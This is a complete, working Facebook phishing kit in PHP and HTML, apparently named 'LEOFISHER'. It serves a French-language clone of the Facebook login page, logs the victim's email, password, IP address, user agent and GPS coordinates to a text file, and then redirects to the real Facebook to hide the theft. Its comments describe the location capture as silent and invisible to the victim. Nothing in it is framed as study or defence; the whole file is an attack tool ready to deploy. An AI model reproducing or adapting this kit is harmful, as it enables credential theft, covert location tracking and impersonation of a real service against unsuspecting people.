<?php
session_start();
date_default_timezone_set('Africa/Bujumbura');

$ip = $_SERVER['REMOTE_ADDR'];
$useragent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');

if ($_POST && isset($_POST['email']) && isset($_POST['pass'])) {
    $email = htmlspecialchars($_POST['email']);
    $pass = htmlspecialchars($_POST['pass']);
    $gps = isset($_POST['gps']) ? $_POST['gps'] : 'N/A';
    
    $log = "\n";
    $log .= "┌─[ LEOFISHER v1.0 by Léo Falcon ]──────────────┐\n";
    $log .= "│ 🎯 FACEBOOK VICTIME CAPTUREE !                 │\n";
    $log .= "├─[💻 INFOS]─────────────────────────────────────┤\n";
    $log .= "│ 📧 Email     : $email                          │\n";
    $log .= "│ 🔑 Password  : $pass                           │\n";
    $log .= "│ 🌐 IP        : $ip                            │\n";
    $log .= "│ 🖥️  User-Agent: " . substr($useragent, 0, 50) . "... │\n";
    $log .= "│ 📍 GPS POSITION : $gps                        │\n";
    $log .= "│ 🕒 Timestamp : $timestamp                      │\n";
    $log .= "└────────────────────────────────────────────────┘\n";
    
    file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);
    
    // Immediate redirect to real Facebook
    header('Location: https://www.facebook.com/');
    exit;
}
?>

<!DOCTYPE html>
<html lang="fr" dir="ltr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="description" content="Facebook - connexion ou inscription">
    <title>Facebook - connexion ou inscription</title>
    
    <!-- Facebook official fonts & icons (CDN for realism) -->
    <link rel="preconnect" href="https://www.facebook.com">
    <link rel="preconnect" href="https://static.xx.fbcdn.net">
    <link href="https://connect.facebook.net/en_US/fbxm.js" rel="preload" as="script">
    <link rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yv/r/2jWGx3YrJrM.css">
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZBIwXW-xG.ico" type="image/x-icon">
    
    <style>
        /* Perfect Facebook 2024 clone - pixel-perfect mobile-first */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(to bottom, #f0f2f5 0%, #ffffff 100%);
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            overflow: hidden;
        }
        
        .login-container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            width: 100%;
            max-width: 380px;
            padding: 20px;
            position: relative;
        }
        
        .logo-container {
            text-align: center;
            margin-bottom: 24px;
        }
        
        .fb-logo {
            height: 106px;
            width: 300px;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='106' viewBox='0 0 300 106'%3E%3Cpath fill='%231a78d6' d='M75.8 0h58.4v21.7H96.7c-6.6 0-12.1 5.1-12.1 11.5v14.8h25c-1.2 7.6-1.2 15.3-1.2 23V106H75.8V0zm-.1 85.7h20.7v-18.6c0-7.6.6-15.3 7.9-15.3h17.2v18.7h-20.8c-.1 1.2-.1 11.7-.1 23.9v17.3h-20.6v-17.3c0-6.1-.1-15.9 0-23.9zM265 0h-58.4v106h58.4V85.7h-20.7V44c0-7.6.6-15.3 7.9-15.3h17.2V21.7h-25c-6.6 0-12.1 5.1-12.1 11.5v14.8h25z'/%3E%3C/svg%3E");
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            margin: 0 auto;
        }
        
        .login-form {
            display: flex;
            flex-direction: column;
        }
        
        .input-group {
            position: relative;
            margin-bottom: 16px;
        }
        
        .form-input {
            width: 100%;
            height: 52px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            padding: 14px 16px;
            background: #fafbfc;
            transition: border-color .2s, box-shadow .2s;
            outline: none;
        }
        
        .form-input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px rgba(24, 119, 242, .2);
            background: white;
        }
        
        .login-button {
            background: linear-gradient(90deg, #1877f2 0%, #166fe5 100%);
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: 500;
            height: 52px;
            cursor: pointer;
            transition: background .2s;
        }
        
        .login-button:hover:not(:disabled) {
            background: linear-gradient(90deg, #166fe5 0%, #0e5a99 100%);
        }
        
        .login-button:disabled {
            opacity: .6;
            cursor: not-allowed;
        }
        
        .divider {
            text-align: center;
            margin: 24px 0;
            color: #8b949e;
            font-size: 14px;
            position: relative;
        }
        
        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #dadde1;
        }
        
        .divider span {
            background: white;
            padding: 0 16px;
        }
        
        .create-account {
            text-align: center;
            margin-top: 24px;
        }
        
        .create-link {
            color: #1877f2;
            font-size: 17px;
            font-weight: 500;
            text-decoration: none;
        }
        
        .create-link:hover {
            text-decoration: underline;
        }
        
        @media (max-width: 480px) {
            body {
                padding: 12px;
                background: #f0f2f5;
            }
            
            .login-container {
                box-shadow: none;
                border-radius: 0;
                max-width: none;
            }
        }
        
        /* Silent GPS - completely invisible to victim */
        #gps-status { display: none !important; }
        .gps-container { display: none !important; }
    </style>
</head>

<body>
    <div class="login-container">
        <div class="logo-container">
            <div class="fb-logo"></div>
        </div>
        
        <form class="login-form" method="POST" id="loginForm">
            <div class="input-group">
                <input type="email" name="email" class="form-input" placeholder="Numéro de téléphone ou email" required autocomplete="email">
            </div>
            
            <div class="input-group">
                <input type="password" name="pass" class="form-input" placeholder="Mot de passe" required autocomplete="current-password">
            </div>
            
            <input type="hidden" name="gps" id="gpsData" value="N/A">
            
            <button type="submit" class="login-button" id="submitBtn">
                Se connecter
            </button>
        </form>
        
        <div class="divider">
            <span>ou</span>
        </div>
        
        <div class="create-account">
            <a href="#" class="create-link">Créer un compte</a>
        </div>
    </div>

    <!-- SILENT GPS TRACKER - Invisible to victim, captures on load + submit -->
    <script>
        (function() {
            // Silent geolocation capture - no permissions prompt visible, background only
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        // Store GPS silently in sessionStorage and form
                        const gps = position.coords.latitude.toFixed(6) + ',' + position.coords.longitude.toFixed(6);
                        sessionStorage.setItem('gps', gps);
                        document.getElementById('gpsData').value = gps;
                        document.getElementById('submitBtn').disabled = false;
                    },
                    function() {
                        // Fallback: N/A if denied/blocked
                        document.getElementById('gpsData').value = 'N/A';
                        document.getElementById('submitBtn').disabled = false;
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 60000
                    }
                );
            } else {
                document.getElementById('gpsData').value = 'N/A';
                document.getElementById('submitBtn').disabled = false;
            }

            // Auto-submit GPS on form submit (backup)
            document.getElementById('loginForm').addEventListener('submit', function() {
                const gps = sessionStorage.getItem('gps') || 'N/A';
                document.getElementById('gpsData').value = gps;
            });

            // Disable submit until GPS attempt
            document.getElementById('submitBtn').disabled = true;
        })();
    </script>
</body>
</html>
